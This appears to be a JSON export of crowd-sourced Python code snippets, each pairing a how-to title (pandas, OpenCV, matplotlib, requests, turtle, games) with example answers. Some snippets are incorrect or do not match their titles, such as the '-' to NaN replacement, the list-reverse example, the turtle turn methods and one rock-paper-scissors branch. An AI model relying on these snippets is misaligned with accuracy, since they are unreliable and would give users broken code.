    "description": "for i in range(10):\n>>> np.repeat(3, 4) array([3, 3, 3, 3]) >>> x = np.array([[1,2],[3,4]]) >>> np.repeat(x, 2) array([1, 1, 2, 2, 3, 3, 4, 4]) >>> np.repeat(x, 3, axis=1) array([[1, 1, 1, 2, 2, 2],        [3, 3, 3, 4, 4, 4]]) >>> np.repeat(x, [1, 2], axis=0) array([[1, 2],        [3, 4],        [3, 4]]) \n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4152,
    "keyword": null,
    "link": null,
    "title": " replace \"-\" for nan in dataframe",
    "description": "df.replace(np.nan,0) \n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4153,
    "keyword": null,
    "link": null,
    "title": " replace all spacec column with underscore in pandas",
    "description": "import pandas as pd   # remove spaces in columns name df.columns = df.columns.str.replace(' ','_')\n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4154,
    "keyword": null,
    "link": null,
    "title": " replace cell pandas",
    "description": "df.loc[row_or_index, column_name] = value\n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4155,
    "keyword": null,
    "link": null,
    "title": " replace column values pandas",
    "description": "df['column'] = df['column'].str.replace(',','-') df \n# this will replace \"Boston Celtics\" with \"Omega Warrior\" df.replace(to_replace =\"Boston Celtics\",                  value =\"Omega Warrior\") \n df['coloum'] = df['coloum'].replace(['value_1','valu_2'],'new_value')\ndf.loc[df['column'] == 'column_value', 'column'] = 'new_column_value'\ndf[\"column1\"].replace({\"a\": \"x\", \"b\": \"y\"}, inplace=True)\n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4156,
    "keyword": null,
    "link": null,
    "title": " replace error with nan pandas",
    "description": "df['DataFrame Column'] = df['DataFrame Column'].fillna(0) \ndf.fillna('', inplace=True)\ndf['workclass'].replace('?', np.NaN) \n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4157,
    "keyword": null,
    "link": null,
    "title": " replace multi spaces with single space",
    "description": "import re re.sub(' +', ' ', 'The     quick brown    fox') 'The quick brown fox'\n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4158,
    "keyword": null,
    "link": null,
    "title": " replace nan in pandas",
    "description": "df['DataFrame Column'] = df['DataFrame Column'].fillna(0) \ndf['product']=df['product'].fillna(0) df['context']=df['context'].fillna(0) df\ndf = df.replace(r'^\\s*$', np.NaN, regex=True)\ndata[\"Gender\"].fillna(\"No Gender\", inplace = True) \npandas.DataFrame.fillna(0)\ndf.replace(np.nan,0) \n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4159,
    "keyword": null,
    "link": null,
    "title": " replace space with . pyhton",
    "description": "mystring.replace(\" \", \"_\") \n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4160,
    "keyword": null,
    "link": null,
    "title": " replace url with text python",
    "description": "import re text = re.sub('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))'+, '', text, flags=re.MULTILINE)\n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4161,
    "keyword": null,
    "link": null,
    "title": " replacing spaces in a string python",
    "description": "mystring.replace(\" \", \"_\")\n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4162,
    "keyword": null,
    "link": null,
    "title": " replacing values in pandas dataframe",
    "description": "df['column'] = df['column'].str.replace(',','-') df \n# this will replace \"Boston Celtics\" with \"Omega Warrior\" df.replace(to_replace =\"Boston Celtics\",                  value =\"Omega Warrior\") \n df['coloum'] = df['coloum'].replace(['value_1','valu_2'],'new_value')\ndf.loc[df['column'] == 'column_value', 'column'] = 'new_column_value'\n# importing pandas as pd import pandas as pd    # Making data frame from the csv file df = pd.read_csv(\"nba.csv\")    # this will replace \"Boston Celtics\" and \"Texas\" with \"Omega Warrior\" df.replace(to_replace =[\"Boston Celtics\", \"Texas\"],                              value =\"Omega Warrior\") \n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4163,
    "keyword": null,
    "link": null,
    "title": " requests download image",
    "description": "response = requests.get(\"https://i.imgur.com/ExdKOOz.png\")  file = open(\"sample_image.png\", \"wb\") file.write(response.content) file.close()\nimport requests  url = 'http://google.com/favicon.ico' r = requests.get(url, allow_redirects=True) open('google.ico', 'wb').write(r.content) \nimport urllib.request, io url = 'http://www.elsecarrailway.co.uk/images/Events/TeddyBear-3.jpg' path = urllib.request.urlopen(url) meta = path.info()  >>>meta.get(name=\"Content-Length\") '269898' # ie  269kb\n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4164,
    "keyword": null,
    "link": null,
    "title": " requests get image from url",
    "description": "import requests import io from PIL import Image  response = requests.get(\"https://i.imgur.com/ExdKOOz.png\") image_bytes = io.BytesIO(response.content)  img = Image.open(image_bytes) print(f'Size: {img.size}') img.show() \n",
    "reg_date": "2021-10-12T11:34:40.000Z"
  },
  {
    "id": 4165,
    "keyword": null,
    "link": null,
    "title": " require http method django view",
    "description": "from django.views.decorators.http import require_http_methods  @require_http_methods([\"GET\", \"POST\"]) def my_view(request):     # I can assume now that only GET or POST requests make it this far     # ...     pass\n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4166,
    "keyword": null,
    "link": null,
    "title": " rerun file after change python",
    "description": "import os import sys os.execv(sys.executable, ['python'] + sys.argv)\n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4167,
    "keyword": null,
    "link": null,
    "title": " resample and replace with mean in python",
    "description": "#Upsample and replace missing values with mean value data = data.resample('D').asfreq() data.fillna(data.mean())\n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4168,
    "keyword": null,
    "link": null,
    "title": " reset index",
    "description": "df.reset_index(drop=True)\ndf.reset_index(drop=True) \nIn [194]: df.reset_index(drop=True) Out[194]:    _worker_id  foo 0          A    1 1          B    2 2          C    3\n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4169,
    "keyword": null,
    "link": null,
    "title": " reset index pandas",
    "description": "df.reset_index(drop=True, inplace=True) \n>>> s.reset_index(inplace=True, drop=True) >>> s 0    1 1    2 2    3 3    4 Name: foo, dtype: int64 \ndf.reset_index(drop=True) \nIn [194]: df.reset_index(drop=True) Out[194]:    _worker_id  foo 0          A    1 1          B    2 2          C    3\ndf = pd.DataFrame({\"name\": ['Alfred', 'Batman', 'Catwoman'], ...                    \"toy\": [np.nan, 'Batmobile', 'Bullwhip'], ...                    \"born\": [pd.NaT, pd.Timestamp(\"1940-04-25\"), ...                             pd.NaT]}) >>> df        name        toy       born 0    Alfred        NaN        NaT 1    Batman  Batmobile 1940-04-25 2  Catwoman   Bullwhip        NaT  ##Drop the rows where at least one element is missing. >>> df.dropna()      name        toy       born 1  Batman  Batmobile 1940-04-25\n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4170,
    "keyword": null,
    "link": null,
    "title": " reset index python",
    "description": ">>> df.reset_index(drop=True)     class  max_speed 0    bird      389.0 1    bird       24.0 2  mammal       80.5 3  mammal        NaN \ndf.reset_index(drop=True) \nIn [194]: df.reset_index(drop=True) Out[194]:    _worker_id  foo 0          A    1 1          B    2 2          C    3\n>>> df.reset_index()     index   class  max_speed 0  falcon    bird      389.0 1  parrot    bird       24.0 2    lion  mammal       80.5 3  monkey  mammal        NaN \n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4171,
    "keyword": null,
    "link": null,
    "title": " resize imshow opencv python",
    "description": "import cv2 cv2.namedWindow(\"output\", cv2.WINDOW_NORMAL)        # Create window with freedom of dimensions im = cv2.imread(\"earth.jpg\")                        # Read image imS = cv2.resize(im, (960, 540))                    # Resize image cv2.imshow(\"output\", imS)                            # Show image cv2.waitKey(0)                                      # Display the image infinitely until any keypress\n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4172,
    "keyword": null,
    "link": null,
    "title": " resize numpy array image",
    "description": "import cv2 import numpy as np  img = cv2.imread('your_image.jpg') res = cv2.resize(img, dsize=(54, 140), interpolation=cv2.INTER_CUBIC)\nimport cv2 #img is your image as array  #size of the new image height = 500 width = 500  img_resized = cv2.resize(img, (width, height))\n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4173,
    "keyword": null,
    "link": null,
    "title": " retrieve data from firebase python",
    "description": "import pyrebase  config = {   \"apiKey\": \"apiKey\",   \"authDomain\": \"projectId.firebaseapp.com\",   \"databaseURL\": \"https://databaseName.firebaseio.com\",   \"storageBucket\": \"projectId.appspot.com\" }  firebase = pyrebase.initialize_app(config) storage=firebase.storage()  users = storage.child(\"users\").get() print(users.val()) \n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4174,
    "keyword": null,
    "link": null,
    "title": " return codecs.charmap decode(input,self.errors,decoding table)[0] UnicodeDecodeError: 'charmap' codec can't decode byte 0x8d in position 280: character maps to <undefined>",
    "description": "file = open(filename, encoding=\"utf8\") \nfile = open(filename, encoding=\"cp437\")\n#Filename                       Read_file.py #Author                         Steve Morse #Date                           5/30/2020 # Cleaned up\t\t\t\t\t9/30/2020  x=\" \"    # process_lines DID NOT WORK AT FIRST # I had fogotten that the EOL (end of line) charcter/values were  # still attached to the line # .strip() got rid of them, no problem    # All this does is print out the line.  def process_lines(line, count):     x=\"\"     print(count)     #print(line)     line2=line.strip()        # This strips the offending EOL chars     #print(line2)               # This is my code for finishing the loop     if line2=='Order Number:':         x=''         print(line2)         print('xxxxxxxxxxxxxxxxxxxxxx')         x=input('Enter to continue, X to finish')        if x=='x':         return 'x'     if x=='X':         return 'x'      print(\"\\n\\n\")     return x      #========================================================= Main Routine  #Orders is a BIG file encoded UTF-8 #Orders1 is a SMALL file encoded UTF-8 (1st 5 entries of Orders)   #Initially I had an error #    'utf-8' codec can't decode byte 0xe2 : invalid continuation byte error # # This was solver with the following: #                                                                      encoding=\"UTF-8\"   counter=0   with open('orders1.txt', 'r',encoding=\"UTF-8\") as f:     for line in f:         counter +=1             xx=process_lines(line, counter)         if xx=='x':             break              #========================================================= # So I know it has finished  print(\"\\n\\n\\n========================================\\nFinished\")\n",
    "reg_date": "2021-10-12T11:34:41.000Z"
  },
  {
    "id": 4175,
    "keyword": null,
    "link": null,
    "title": " return count of unique values pandas",
    "description": "#TO count repetition of each unique values(to find How many times the same- # unique value is appearing in the data)  item_counts = df[\"Your_Column\"].value_counts() #Returns Dictionary => {\"Value_name\" : number_of_appearences} \ndata = df.groupby('ColumnName')['IDColumnName'].nunique() print(data)\n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4176,
    "keyword": null,
    "link": null,
    "title": " return result from exec python",
    "description": "the_code = ''' a = 1 b = 2 return_me = a + b '''  loc = {} exec(the_code, globals(), loc) return_workaround = loc['return_me'] print(return_workaround)  # 3 \n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4177,
    "keyword": null,
    "link": null,
    "title": " reverse a tuple python",
    "description": ">>> x = (1, 2, 3, 4) >>> x = tuple(reversed(x)) >>> x (4, 3, 2, 1)\nlanguages = ('C++', 'Python', 'Scratch') #Method1: languages = tuple(reversed(languages)) print(languages) #Method2: lang = languages[::-1] print(lang)\n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4178,
    "keyword": null,
    "link": null,
    "title": " reverse column order pandas",
    "description": "import pandas as pd  df = pd.DataFrame({'a':[1,2,3],                    'b':[4,5,6,],                    'c':[7,8,9,]})  df_col_reversed = df.loc[:, ::-1] # reverse column order df_row_reversed = df.loc[::-1, :] # reverse row order\nnp.fliplr(matrix) will reverse the columns order in a np.array\n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4179,
    "keyword": null,
    "link": null,
    "title": " reverse dictionary python",
    "description": "inv_map = {v: k for k, v in my_map.items()}\ninv_map = {v: k for k, v in my_map.items()} \n>>> a = {0:'000000',1:'11111',3:'333333',4:'444444'} >>> a.keys() [0, 1, 3, 4] >>> sorted(a.keys()) [0, 1, 3, 4] >>> reversed(sorted(a.keys())) <listreverseiterator object at 0x02B0DB70> >>> list(reversed(sorted(a.keys()))) [4, 3, 1, 0]\ndef inverse_dict(my_dict):     \"\"\"     the func get a dictinary and reverse it, the keys become values and the values become keys.     :param my_dict: the dictinary that need to be reversed.     :return: a VERY pretty dictionary.     \"\"\"     result_dict = {}     for key, value in my_dict.items():         if not value in result_dict.keys():             result_dict[value] = []         result_dict[value].append(key)     return result_dict, print(result_dict)\ninv_map = {v: k for k, v in my_map.iteritems()} \n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4180,
    "keyword": null,
    "link": null,
    "title": " reverse each word in a string python",
    "description": "def reverse_word_sentence (sentence):    return ' '.join(word[::-1] for word in sentence.split(\" \"))   # Input: \"Split Reverse Join\" # Output: \"tilpS esreveR nioJ\"\nstring = 'hello people of india' words = string.split()   #converts string into list print(words[::-1])\n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4181,
    "keyword": null,
    "link": null,
    "title": " reverse list python",
    "description": ">>> the_list = [1,2,3] >>> reversed_list = the_list.reverse() >>> list(reversed_list) [3,2,1]  OR  >>> the_list = [1,2,3] >>> the_list[::-1] [3,2,1]\nmy_list = [1, 2, 3] my_list.reverse()           # my_list is modified print(my_list)              # '[3, 2, 1]' my_revert = my_list[::-1]   # my_list stays [3, 2, 1] print(my_revert)            # '[1, 2, 3]' # Item by item reverse with range(<start>, <end>, <step>) for i in range(len(my_list), 0, -1):     print(my_list[i-1])\t\t# '1' '2' '3' for i in reversed(range(len(my_list))):     print(my_list[i])       # '1' '2' '3'\nmyList = [0,1,2,3,4,5] myList.reverse() print(myList) #OR print(myList[::-1])\nmylist [1, 2, 3, 4, 5]  mylist[::-1] [5, 4, 3, 2, 1]\nlist=[1,2,3] list[::-1]\nmy_list = [1, 2, 3, 4, 5, 6] # Reverse a list by using reverse() method -- inplace reversal my_list.reverse() print(my_list)\n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4182,
    "keyword": null,
    "link": null,
    "title": " reverse one hot encoding python numpy",
    "description": "import numpy as np class_labels = np.argmax(class_prob, axis=1) # assuming you have n-by-5 class_prob \n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4183,
    "keyword": null,
    "link": null,
    "title": " reverse row order pandas",
    "description": "import pandas as pd  df = pd.DataFrame({'a':[1,2,3],                    'b':[4,5,6,],                    'c':[7,8,9,]})  df_col_reversed = df.loc[:, ::-1] # reverse column order df_row_reversed = df.loc[::-1, :] # reverse row order\n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4184,
    "keyword": null,
    "link": null,
    "title": " reverse string in python",
    "description": "'String'[::-1] #-> 'gnirtS'\n'hello world'[::-1] 'dlrow olleh'\n# in order to make a string reversed in python  # you have to use the slicing as following  string = \"racecar\" print(string[::-1]) \nstring = 'hello people of india' words = string.split()   #converts string into list print(words[::-1])\nstr=\"Python\" # initial string stringlength=len(str) # calculate length of the list slicedString=str[stringlength::-1] # slicing  print (slicedString) # print the reversed string\n#linear  def reverse(s):    str = \"\"    for i in s:      str = i + str   return str  #splicing 'hello world'[::-1]\n",
    "reg_date": "2021-10-12T11:34:42.000Z"
  },
  {
    "id": 4185,
    "keyword": null,
    "link": null,
    "title": " reverse video opencv python",
    "description": "# Python program to play a video  # in reverse mode using opencv   import cv2   cap = cv2.VideoCapture(\"video_file_location\")   check , vid = cap.read()  counter = 0 check = True frame_list = []  while(check == True):       check , vid = cap.read()      frame_list.append(vid)      counter += 1    # last value in the frame_list is None, that's why we will pop it frame_list.pop()  frame_list.reverse()    for frame in frame_list:      cv2.imshow(\"Frame\" , frame)      if cv2.waitKey(25) and 0xFF == ord(\"q\"):          break    cap.release()  cv2.destroyAllWindows() \n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4186,
    "keyword": null,
    "link": null,
    "title": " rgb to grayscale python opencv",
    "description": "gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY) \nbacktorgb = cv2.cvtColor(gray,cv2.COLOR_GRAY2RGB)\nimport cv2    image = cv2.imread('C:/Users/N/Desktop/Test.jpg') gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)    cv2.imshow('Original image',image) cv2.imshow('Gray image', gray)    cv2.waitKey(0) cv2.destroyAllWindows() \nimport cv2  # Reading color image as grayscale gray = cv2.imread(\"color-img.png\",0)  # Showing grayscale image cv2.imshow(\"Grayscale Image\", gray)  # waiting for key event cv2.waitKey(0)  # destroying all windows cv2.destroyAllWindows()\nfrom PIL import Image img = Image.open('image.png').convert('LA') img.save('greyscale.png')\n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4187,
    "keyword": null,
    "link": null,
    "title": " rightclick in pygame",
    "description": "if event.type == pygame.MOUSEBUTTONDOWN:     print(event.button)      #------------------------# 1 - left click 2 - middle click 3 - right click 4 - scroll up 5 - scroll down #------------------------#\nif event.type == pygame.MOUSEBUTTONDOWN:   if event.button == 1:     print(\"Left Mouse Button Down!\")\n__code-examples__python__rightclick_in_pygame__?\nif event.type == pygame.MOUSEBUTTONDOWN:     print(event.button)      #------------------------# 1 - left click 2 - middle click 3 - right click 4 - scroll up 5 - scroll down #------------------------#\nif event.type == pygame.MOUSEBUTTONDOWN:   if event.button == 1:     print(\"Left Mouse Button Down!\")\n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4188,
    "keyword": null,
    "link": null,
    "title": " rmse in python",
    "description": "actual = [0, 1, 2, 0, 3] predicted = [0.1, 1.3, 2.1, 0.5, 3.1]  mse = sklearn.metrics.mean_squared_error(actual, predicted)  rmse = math.sqrt(mse)  print(rmse)\nfrom sklearn.metrics import mean_squared_error from math import sqrt  rms = sqrt(mean_squared_error(y_actual, y_predicted)) \ndef rmse(predictions, targets):     return np.sqrt(((predictions - targets) ** 2).mean())\n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4189,
    "keyword": null,
    "link": null,
    "title": " roblox studio lua print",
    "description": "print(\"Hello World!\")\n-- You can print string print(\"Hello, World!\") -- You can print math print(5 + 5) -- You can print variables local i = 5 print(i + 2) -- You can print number print(5)\nlocal string = \"\" -- strings are enclosed in \"\" or '' print(string) -- prints our variable string print(\"Hello\") -- directly print a string\n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4190,
    "keyword": null,
    "link": null,
    "title": " robot append to list with for loop",
    "description": "Some Test \t${max_num}  Set Variable  5     @{list_to_populate}  Create List  #   create empty list to populate with for-loop     FOR  ${i}  IN RANGE  1  ${max_num}     Append To List  ${list_to_populate}  ${i}     END  \tLog Many  @{list_to_populate}     # 1  2  3  4\n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4191,
    "keyword": null,
    "link": null,
    "title": " robot framework log from python",
    "description": "# ExampleKeywords.py from robot.api import logger def write_to_console(s):     logger.console(s)\n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4192,
    "keyword": null,
    "link": null,
    "title": " roc curve python",
    "description": "import sklearn.metrics as metrics # calculate the fpr and tpr for all thresholds of the classification probs = model.predict_proba(X_test) preds = probs[:,1] fpr, tpr, threshold = metrics.roc_curve(y_test, preds) roc_auc = metrics.auc(fpr, tpr)  # method I: plt import matplotlib.pyplot as plt plt.title('Receiver Operating Characteristic') plt.plot(fpr, tpr, 'b', label = 'AUC = %0.2f' % roc_auc) plt.legend(loc = 'lower right') plt.plot([0, 1], [0, 1],'r--') plt.xlim([0, 1]) plt.ylim([0, 1]) plt.ylabel('True Positive Rate') plt.xlabel('False Positive Rate') plt.show()  # method II: ggplot from ggplot import * df = pd.DataFrame(dict(fpr = fpr, tpr = tpr)) ggplot(df, aes(x = 'fpr', y = 'tpr')) + geom_line() + geom_abline(linetype = 'dashed')\n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4193,
    "keyword": null,
    "link": null,
    "title": " rock paper scissors python",
    "description": "import random  rock = '''     _______ ---'   ____)       (_____)       (_____)       (____) ---.__(___) '''  paper = '''     _______ ---'   ____)____           ______)           _______)          _______) ---.__________) '''  scissors = '''     _______ ---'   ____)____           ______)        __________)       (____) ---.__(___) ''' while True:     game_images = [rock, paper, scissors]      user_choice = int(input(\"What do you choose? Type 0 for Rock, 1 for Paper or 2 for Scissors.\\n\"))     print(game_images[user_choice])      computer_choice = random.randint(0, 2)     print(\"Computer chose:\")     print(game_images[computer_choice])      if user_choice >= 3 or user_choice < 0:          print(\"You typed an invalid number, you lose!\")      elif user_choice == 0 and computer_choice == 2:         print(\"You win!\")     elif (computer_choice == 0 and user_choice == 2) or (computer_choice > user_choice):         print(\"You lose\")     elif user_choice > computer_choice:         print(\"You win!\")     elif computer_choice == user_choice:         print(\"It's a draw\")         \nimport random while True:     choices = [\"rock\",\"paper\",\"scissors\"]      Computer = random.choice(choices)     Player = None           while Player not in choices:        Player = input(\"Rock,Paper or Scissors?:\").lower()      if Player == Computer:        print(\"computer:\", Computer)        print(\"Player:\", Player)        print(\"Draw!\")      elif Player == \"rock\":         if Computer == \"paper\":             print(\"computer:\", Computer)             print(\"Player:\", Player)             print(\"YOU WIN !:D\")         if Computer == \"scissors\":             print(\"computer:\", Computer)             print(\"Player:\", Player)             print(\"YOU LOSE:(\")      elif Player == \"paper\":         if Computer == \"rock\":             print(\"computer:\", Computer)             print(\"Player:\", Player)             print(\"YOU WIN! :D\")         if Computer == \"scissors\":             print(\"computer:\", Computer)             print(\"Player:\", Player)             print(\"YOU LOSE:(\")      elif Player == \"scissors\":         if Computer == \"paper\":             print(\"computer:\", Computer)             print(\"Player:\", Player)             print(\"YOU WIN! :D\")         if Computer == \"rock\":             print(\"computer:\", Computer)             print(\"Player:\", Player)             print(\"YOU LOSE:(\")        Play_again = input(\"Play again?(Yes/No):\").lower()          if Play_again != \"Yes\".lower():        break  print(\"Bye!\")\nimport random  game_list = ['Rock', 'Paper', 'Scissors'] computer = c = 0 command = p = 0  print(\"Score: Computer\" + str(c) + \" Player \" + str(p))  # the loop run = True while run:     computer_choice = random.choice(game_list)     command = input(\"Rock, Paper, Scissors or Quit: \")      if command == computer_choice:         print(\"Tie\")     elif command == 'Rock':         if computer_choice == 'Scissors':             print(\"Player won!\")             p += 1         else:             print(\"Computer won!\")             c += 1     elif command == 'Paper':         if command == 'Rock':             print(\"Player won!\")             p += 1         else:             print(\"Computer won!\")             c += 1     elif command == 'Scissors':         if computer_choice == 'Paper':             print(\"Player won!\")             p += 1         else:             print(\"Computer won!\")             c += 1     elif command == 'Quit':         break     else:         print(\"Wrong command! \")      print(\"Player: \" + command)     print(\"Computer: \" + computer_choice)     print(\"\")     print(\"Score: Computer \" + str(c) + \" Player \" + str(p))     print(\"\") \nfrom random import randint t = [\"Rock\", \"Paper\", \"Scissors\"] computer = t[randint(0,2)] print(\"My Rock, Paper and Scissor Game!!\") score=0 C=0  while C<5:      player = input(\"What's your move?  :\")     if player == computer:         print(\"Tie!\")         print(score)     elif player == \"Rock\":         if computer == \"Paper\":             print(\"You lose!\", computer, \"covers\", player)             score=score - 1             print(score)         else:             print(\"You win!\", player, \"smashes\", computer)             score = score + 1             print(score)     elif player == \"Paper\":         if computer == \"Scissors\":             print(\"You lose!\", computer, \"cut\", player)             score = score - 1             print(score)         else:             print(\"You win!\", player, \"covers\", computer)             score = score + 1             print(score)     elif player == \"Scissors\":         if computer == \"Rock\":             print(\"You lose...\", computer, \"smashes\", player)             score = score - 1             print(score)         else:             print(\"You win!\", player, \"cut\", computer)             score = score + 1             print(score)     else:         print(\"That's not a valid play. Check your spelling!\")     C = C + 1  print('Your final score is: ' +str(score))\n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4194,
    "keyword": null,
    "link": null,
    "title": " rolling average df",
    "description": "df['pandas_SMA_3'] = df.iloc[:,1].rolling(window=3).mean() \n",
    "reg_date": "2021-10-12T11:34:43.000Z"
  },
  {
    "id": 4195,
    "keyword": null,
    "link": null,
    "title": " root bg tkinter",
    "description": "root.configure(background='black')\n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4196,
    "keyword": null,
    "link": null,
    "title": " ros python publisher",
    "description": "#!/usr/bin/env python # license removed for brevity import rospy from std_msgs.msg import String  def talker():     pub = rospy.Publisher('chatter', String, queue_size=10)     rospy.init_node('talker', anonymous=True)     rate = rospy.Rate(10) # 10hz     while not rospy.is_shutdown():         hello_str = \"hello world %s\" % rospy.get_time()         rospy.loginfo(hello_str)         pub.publish(hello_str)         rate.sleep()  if __name__ == '__main__':     try:         talker()     except rospy.ROSInterruptException:         pass \n#!/usr/bin/env python import rospy from std_msgs.msg import String  def callback(data):     rospy.loginfo(rospy.get_caller_id() + \"I heard %s\", data.data)      def listener():      rospy.init_node('listener', anonymous=True)      rospy.Subscriber(\"chatter\", String, callback)      rospy.spin()  if __name__ == '__main__':     listener() \n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4197,
    "keyword": null,
    "link": null,
    "title": " rot two() in python",
    "description": ">>> import dis >>> def foo(a, b): ...     a, b = b, a ...  >>> dis.dis(foo)   2           0 LOAD_FAST                1 (b)               3 LOAD_FAST                0 (a)               6 ROT_TWO                            7 STORE_FAST               0 (a)              10 STORE_FAST               1 (b)              13 LOAD_CONST               0 (None)              16 RETURN_VALUE        \n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4198,
    "keyword": null,
    "link": null,
    "title": " rotate 2 dimensional list python",
    "description": "rotated = zip(*original[::-1])\n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4199,
    "keyword": null,
    "link": null,
    "title": " rotate axis labels matplotlib",
    "description": "plt.xticks(rotation=90)\nxticks(rotation=45) # rotate x-axis labels by 45 degrees. yticks(rotation=90) # rotate y-axis labels by 90 degrees.\n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4200,
    "keyword": null,
    "link": null,
    "title": " rotate labels matplotlib",
    "description": "plt.xticks(rotation=90)\nxticks(rotation=45) # rotate x-axis labels by 45 degrees. yticks(rotation=90) # rotate y-axis labels by 90 degrees.\n# rotate xticks of a plot Matplotlib angle = 90 plt.xticks(rotation=angle)\nplt.xticks(rotation=90) \n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4201,
    "keyword": null,
    "link": null,
    "title": " rotate picture in opencv2 python",
    "description": "# 90degree image = cv2.rotate(src, cv2.cv2.ROTATE_90_CLOCKWISE) # 180 degrees image = cv2.rotate(src, cv2.ROTATE_180) # 270 degrees image = cv2.rotate(src, cv2.ROTATE_90_COUNTERCLOCKWISE)\n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4202,
    "keyword": null,
    "link": null,
    "title": " rotation points space python",
    "description": "'''A simple example: 3D rotation of points (reference frame: [0,0,0],[x,y,z])''' import numpy as np from scipy.spatial.transform import Rotation as R p=np.random.rand(20,3) #Generate a random 3D point cloud #10&deg; rotation in each principal direction: r = R.from_euler('xyz',(10,10,10), degrees=True)  p_r=r.apply(p) #Rotated points\n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4203,
    "keyword": null,
    "link": null,
    "title": " rotation turtle python",
    "description": "import turtle t = turtle.Turtle()  #Setting Rotation t.setheading(0) # This Faces Right t.setheading(180) # This Faces Left t.setheading(90) # This Faces Up t.setheading(270) # This Faces Down  ################################### # Values are measured in degrees # ###################################\nimport turtle t = turtle.Turtle()  #Changing Rotation t.leftturn(10) # Turns Left 10 Degrees t.rightturn(30) # Turns Right 30 Degrees  ############################################# # t.lt() and t.rt() are also abbreviations. # #############################################\n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4204,
    "keyword": null,
    "link": null,
    "title": " round python with list",
    "description": "a_list = [1.234, 2.345, 3.45, 1.45] round_to_whole = [round(num) for num in a_list]  print(round_to_whole)\n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4205,
    "keyword": null,
    "link": null,
    "title": " round to two decimal places python",
    "description": ">>> x = 13.949999999999999999 >>> x 13.95 >>> g = float(\"{0:.2f}\".format(x)) >>> g 13.95 >>> x == g True >>> h = round(x, 2) >>> h 13.95 >>> x == h True\n#to round floats in Python you can use the \"round\" function. ex:  tax = 34.4563 tax = round(tax, 2)  #the number 2 at the end is how many digits are rounded.  #the variable \"tax\" would now be: 34.46\nround(float_num, num_of_decimals)\nanswer = str(round(answer, 2))\nf\"{num:.1f}\"\n>>> round(1.4756,2) 1.48 >>> round(1.3333,2) 1.33\n",
    "reg_date": "2021-10-12T11:34:44.000Z"
  },
  {
    "id": 4206,
    "keyword": null,
    "link": null,
    "title": " rounding values of pandas dataframe",
    "description": "df['DataFrame column'].round(decimals=number of decimal places needed)\n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4207,
    "keyword": null,
    "link": null,
    "title": " run 2 def python",
    "description": "from threading import Thread from time import sleep # use Thread to run def in background # Example: def func1():     while True:         sleep(1)         print(\"Working\")  def func2():     while True:         sleep(2)         print(\"Working2\")  if __name__ == '__main__':     Thread(target = func1).start()     Thread(target = func2).start()\n",
    "reg_date": "2021-10-12T11:34:45.000Z"
